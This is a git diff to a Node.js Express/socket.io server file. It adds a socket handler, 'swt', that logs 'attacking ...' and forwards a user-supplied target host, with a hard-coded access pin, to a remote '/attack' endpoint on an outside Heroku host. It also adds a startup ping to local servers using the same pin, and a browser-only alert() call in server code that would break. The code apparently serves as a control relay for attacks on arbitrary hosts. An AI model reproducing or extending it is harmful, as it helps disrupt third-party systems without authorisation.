@@ -13,7 +13,7 @@ var Req = require('request');
  * Get port from environment and store in Express.
  */
 
-var port = normalizePort(process.env.PORT || '3000');
+var port = normalizePort(process.env.PORT || '8000');
 app.set('port', port);
 
 /**
@@ -93,6 +93,29 @@ function onListening() {
 
 io = require('socket.io')(server);
 
+var servs = [
+  'http://127.0.0.1:5000'
+];
+
+(function () {
+  var n = 0;
+  var f = servs.length;
+  var pin = '1111991';
+
+var get = function () {
+  Req.head({url:servs[n]+'/?hash='+pin},onSuccess);
+}
+  var onSuccess = function (err,response,body) {
+    if (err) return console.log(err);
+    console.log(response);
+    n++;
+    if (n>=f) {}
+    else get();
+  }
+
+  get();
+})();
+
 io.on('connection',function (socket) {
   console.log('user is connected');
 
@@ -110,7 +133,7 @@ socket.on('brq',function (data) {
   },
     function (err,body) {
       if (err) return console.log(err);
-      console.log(body.body)
+    if(body.body == 'done') alert('تم ارسال');
     });
 
 
@@ -118,6 +141,32 @@ socket.on('brq',function (data) {
 
 });
 
+socket.on('swt', function(data) {
+  console.log(data);
+  console.log('attacking ...');
+  sendpost('https://swat-s.herokuapp.com'
+  ,{ host:data.host},function (err,body) {
+    if (err) return console.log(err);
+  if(body.body == 'done') console.log('sent!!');
+  });
+
+});
+
+
+
 
 
 });
+
+function sendpost(server,form,callback) {
+  var pin = '1111991';
+  var server = server+"/attack/?hash="+pin;
+  Req.post({
+    url:server,
+    form:form
+  },
+    function (err,body) {
+      if (err) return console.log(err);
+    console.log(body.body);
+    });
+}
